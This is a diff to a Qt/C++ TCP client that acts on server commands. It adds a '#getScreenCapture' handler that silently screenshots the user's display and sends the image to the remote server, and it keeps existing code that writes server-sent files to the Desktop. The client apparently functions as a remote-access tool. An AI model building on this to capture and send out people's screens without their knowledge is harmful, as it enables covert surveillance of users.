@@ -27,7 +27,6 @@ void MainWindow::ClientStartup()
 
         QObject::connect(socket,&QTcpSocket::readyRead,this,[&](){
             qDebug() << "[+] New message from the server.";
-            QByteArray data;
             data += socket->readAll();
 
 
@@ -140,17 +139,13 @@ void MainWindow::ClientStartup()
                     qDebug() << 123;
                     isTimerCreated = 1;
                     QTimer::singleShot(5000,this,[&](){
-                        QString bufferData = QString(data.first(20));
-                        qDebug() << bufferData;
+                        QString bufferData = data.first(20);
                         bufferData = bufferData.mid(11);
                         QStringList splitData = bufferData.split(":");
                         qint16 size = splitData[0].size();
-                        qDebug() << 123;
                         QByteArray file = data.mid(11+size+1);
-                        qDebug() << 123;
                         QString filSavePath = QDir::homePath() + "/Desktop/" + "sendedFile" + splitData[0];
                         QFile saveFile(filSavePath);
-                        qDebug() << 123;
                         saveFile.open(QIODevice::WriteOnly);
                         saveFile.write(file);
                         saveFile.close();
@@ -163,6 +158,25 @@ void MainWindow::ClientStartup()
                 {
 
                 }
+            }
+            if(data == "#getScreenCapture")
+            {
+                qDebug() << 123;
+                    QScreen *screen = QGuiApplication::primaryScreen();
+                    QPixmap screenPhoto = screen->grabWindow(0);
+                    screenPhoto.save(QDir::tempPath() + "/image.png");
+
+                    QByteArray photoOutput;
+
+                    QFile filePhoto(QDir::tempPath() + "/image.png");
+
+                    filePhoto.open(QIODevice::ReadOnly);
+                    photoOutput = filePhoto.readAll();
+                    filePhoto.close();
+
+                    socket->write("#getScreenCapture:" + QByteArray::number(photoOutput.size()) + ":" + photoOutput);
+                    socket->waitForBytesWritten();
+                    data.clear();
             }
         });
 
